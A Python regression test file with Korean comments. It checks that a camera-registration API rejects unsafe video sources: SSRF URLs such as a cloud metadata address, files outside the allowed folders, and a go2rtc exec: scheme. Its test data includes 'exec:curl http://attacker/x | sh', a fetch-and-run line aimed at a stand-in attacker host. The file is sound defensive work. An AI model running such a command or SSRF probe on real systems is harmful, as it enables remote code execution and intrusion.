"""tests/test_source_allowlist.py — 카메라 source 허용목록 회귀 (1단계 보안 M-4·M-5, 2026-10-10).

배경(점검 실측): `POST /cameras`·`POST /worker/start` 의 source 가 무검증이었다 —
① `http://내부망주소` 를 등록하면 서버(FFmpeg)가 대신 접속(SSRF)하고 ② 로컬 아무 파일이나
등록하면 `/cameras/{cid}/test` 미리보기로 내용이 읽혔으며 ③ go2rtc 에 그대로 넘어가는
source 는 `exec:` 스킴으로 **프로세스 실행**까지 가능했다(M-5).
실사용 조사(승인 2026-10-10): 운영 rtsp:// · 데모 웹캠 번호 · 벤치 로컬 영상 파일 3종뿐 →
camera_registry.validate_source 가 rtsp(s)·숫자·허용 폴더(저장소·VIGENT_DATA_DIR) 안의
실재 파일만 통과시키고, 모든 등록 경로가 거치는 upsert 에서 강제한다.
"""
import os
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "vigent-core"))

import camera_registry  # noqa: E402
import main  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

REPO_FILE = str(ROOT / "vigent-core" / "demo_assets" / "demo1.jpg")   # 저장소 안 실재 파일


class TestSourceAllowlist(unittest.TestCase):
    def setUp(self):
        self.client = TestClient(main.app)
        self._prev_token = os.environ.get("VIGENT_API_TOKEN")
        os.environ.pop("VIGENT_API_TOKEN", None)
        self._tmp = tempfile.TemporaryDirectory(prefix="vigent_test_reg_")
        self._saved = (camera_registry._PUB, camera_registry._SEC)
        camera_registry._PUB = Path(self._tmp.name) / "cameras.json"
        camera_registry._SEC = Path(self._tmp.name) / "camera_secrets.json"

    def tearDown(self):
        camera_registry._PUB, camera_registry._SEC = self._saved
        self._tmp.cleanup()
        if self._prev_token is not None:
            os.environ["VIGENT_API_TOKEN"] = self._prev_token

    def _add(self, source: str):
        return self.client.post("/cameras", json={"id": "t1", "source": source, "enabled": False})

    # ── 차단 ────────────────────────────────────────────────────────────────
    def test_http_source_rejected(self):
        """SSRF: http(s) 스트림은 실사용 0건 — 내부망 정찰 통로라 차단."""
        for bad in ("http://169.254.169.254/latest", "https://내부서버/x"):
            r = self._add(bad)
            self.assertEqual(r.status_code, 400, bad)
            self.assertIn("스킴", r.json()["detail"])

    def test_exec_scheme_rejected(self):
        """M-5: 등록 source 는 go2rtc 로 넘어간다 — exec: 는 프로세스 실행이라 차단."""
        r = self._add("exec:curl http://attacker/x | sh")
        self.assertEqual(r.status_code, 400)

    def test_outside_file_rejected(self):
        """허용 폴더 밖 실재 파일 — /cameras/{cid}/test 미리보기로 읽히는 통로라 차단."""
        with tempfile.NamedTemporaryFile(suffix=".mp4", delete=False) as f:
            outside = f.name
        try:
            r = self._add(outside)
            self.assertEqual(r.status_code, 400)
            self.assertIn("허용 폴더 밖", r.json()["detail"])
        finally:
            os.unlink(outside)

    def test_missing_file_rejected(self):
        r = self._add(str(ROOT / "없는파일.mp4"))
        self.assertEqual(r.status_code, 400)
        self.assertIn("파일이 없습니다", r.json()["detail"])

    def test_worker_start_also_gated(self):
        """두 번째 등록 입구(/worker/start)도 같은 규칙 — 400 으로 거부."""
        r = self.client.post("/worker/start", json={"id": "t2", "source": "http://10.0.0.1/cam"})
        self.assertEqual(r.status_code, 400)

    # ── 허용(기존 사용법 보존) ───────────────────────────────────────────────
    def test_rtsp_webcam_and_repo_file_allowed(self):
        self.assertEqual(self._add("rtsp://user:pw@192.168.0.10:554/s1").status_code, 200)
        self.assertEqual(self._add("0").status_code, 200)                     # 웹캠 번호
        self.assertEqual(self._add(REPO_FILE).status_code, 200)               # 저장소 안 벤치 영상류

    def test_data_dir_file_allowed(self):
        """VIGENT_DATA_DIR 아래 파일(벤치·부하시험 영상 위치) 허용."""
        prev = os.environ.get("VIGENT_DATA_DIR")
        os.environ["VIGENT_DATA_DIR"] = self._tmp.name
        try:
            vid = Path(self._tmp.name) / "mock.mp4"
            vid.write_bytes(b"\x00")
            self.assertEqual(self._add(str(vid)).status_code, 200)
        finally:
            if prev is None:
                os.environ.pop("VIGENT_DATA_DIR", None)
            else:
                os.environ["VIGENT_DATA_DIR"] = prev


if __name__ == "__main__":
    unittest.main()
